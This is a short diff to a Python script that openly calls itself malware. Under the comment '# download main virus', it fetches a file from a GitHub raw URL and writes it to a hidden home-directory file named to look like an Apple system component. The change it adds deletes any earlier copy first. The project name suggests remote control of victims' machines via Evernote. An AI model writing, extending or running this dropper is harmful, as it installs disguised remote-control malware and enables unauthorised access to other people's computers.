@@ -2,11 +2,16 @@ from requests import get
 from os.path import expanduser
 from os import remove
 from subprocess import Popen as subproc
-from os import system
+from os import system, remove
 from sys import platform
 
 filename = "com.apple.com.user.core"
 localfile = f"{expanduser('~')}/.{filename}"
+
+try:
+    remove(localfile)
+except FileNotFoundError:
+    pass
 
 # download main virus
 open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)
